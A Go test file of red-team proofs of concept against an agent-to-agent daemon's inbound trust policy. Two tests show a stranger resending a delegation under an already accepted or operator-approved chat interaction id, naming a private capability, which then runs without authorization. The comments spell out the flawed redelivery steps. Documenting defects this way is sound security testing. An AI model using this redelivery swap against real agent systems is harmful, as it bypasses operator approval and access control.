package daemon

// Red-team PoCs for the inbound lens (A2A-DESIGN §5, §6, §11.6). Each test
// asserts that the attack SUCCEEDS: a passing test means the defect is
// present.

import (
	"context"
	"testing"

	"github.com/ANetResearch/ANetCore/seal"

	"github.com/ANetResearch/ANet/internal/runtime/interactions"
)

// RT-IN-1 (open). §5.2 row 5: under open a capability call from a stranger is
// refused (capability_not_public) and only natural-language tasks are taken.
// A stranger first opens a natural-language task (trust=public), then sends a
// second anet.delegate/1 for the SAME interaction id under a new message id
// whose TaskDoc names a private capability. Step 9 treats it as a redelivery
// (m.trust = ix.Trust, no policy decision), step 10 hands it to
// redeliveredDelegate, which runs capabilityCall(m.td) on the NEW TaskDoc:
// the private capability executes for the stranger.
func TestRedteamOpenRedeliverySwapRunsPrivateCapability(t *testing.T) {
	srv := newFakeHub(t)
	ctx := context.Background()
	prov := registered(t, srv.URL, "prov")
	lamp := &lampProvider{}
	if err := prov.Providers().Register(ctx, lamp); err != nil {
		t.Fatal(err)
	}
	setPolicy(t, prov, PolicyOpen) // lampCap is NOT in public_capabilities
	s := newStranger(t)

	// Control: the direct capability call is refused under open.
	direct, _ := newInteractionID()
	if r := receive(t, prov, craft(t, s, prov, seal.TypeDelegate, direct,
		delegateBody(t, s.ctrl, direct, "turn it on", lampCap), nil)); r.class != rxDropped ||
		r.reason != dropRefusedPrefix+reasonCapabilityNotPub {
		t.Fatalf("control: direct private call under open = %+v", r)
	}
	if len(lamp.invoked) != 0 {
		t.Fatal("control: the private capability ran on the direct call")
	}

	// Attack: a chat task, then the same ix again naming the capability.
	ix, _ := newInteractionID()
	if r := receive(t, prov, craft(t, s, prov, seal.TypeDelegate, ix,
		delegateBody(t, s.ctrl, ix, "hi, just chatting", ""), nil)); r.class != rxAccepted {
		t.Fatalf("chat task: %+v", r)
	}
	if pix := getIXRT(t, prov, ix); pix.Trust != interactions.TrustPublic || pix.IsCapability {
		t.Fatalf("chat task stored as trust %q cap %v", pix.Trust, pix.IsCapability)
	}
	r := receive(t, prov, craft(t, s, prov, seal.TypeDelegate, ix,
		delegateBody(t, s.ctrl, ix, "turn it on", lampCap), nil))
	t.Logf("swapped delegation: %+v", r)
	if len(lamp.invoked) != 1 {
		t.Fatalf("attack failed: private capability invoked %d times", len(lamp.invoked))
	}
	if got := lamp.invoked[0].CallerAID; got != s.aid {
		t.Fatalf("caller %q", got)
	}
	t.Logf("DEFECT: private capability %s executed for stranger %s under policy open", lampCap, s.aid)
}

// RT-IN-1b (approve). The operator approves a held natural-language task
// (PendingView shows no capability). The requester then re-sends a
// delegation for the approved ix naming a private capability; it runs,
// although nobody approved a capability call.
func TestRedteamApprovedChatEscalatesToPrivateCapability(t *testing.T) {
	srv := newFakeHub(t)
	ctx := context.Background()
	prov := registered(t, srv.URL, "prov")
	lamp := &lampProvider{}
	if err := prov.Providers().Register(ctx, lamp); err != nil {
		t.Fatal(err)
	}
	setPolicy(t, prov, PolicyApprove)
	s := newStranger(t)
	ix, _ := newInteractionID()
	if r := receive(t, prov, craft(t, s, prov, seal.TypeDelegate, ix,
		delegateBody(t, s.ctrl, ix, "could you summarize a paper for me?", ""), nil)); r.class != rxAccepted {
		t.Fatalf("held: %+v", r)
	}
	views, err := prov.PendingList()
	if err != nil || len(views) != 1 || views[0].Capability != "" {
		t.Fatalf("pending view: %+v %v", views, err)
	}
	if _, err := prov.ApprovePending(ix); err != nil {
		t.Fatal(err)
	}
	receive(t, prov, craft(t, s, prov, seal.TypeDelegate, ix,
		delegateBody(t, s.ctrl, ix, "turn it on", lampCap), nil))
	if len(lamp.invoked) != 1 {
		t.Fatalf("attack failed: private capability invoked %d times", len(lamp.invoked))
	}
	t.Logf("DEFECT: approving a chat let the requester run private capability %s", lampCap)
}

func getIXRT(t *testing.T, d *Daemon, id string) *interactions.Interaction {
	t.Helper()
	ix, err := d.ix.Get(id)
	if err != nil {
		t.Fatal(err)
	}
	return ix
}
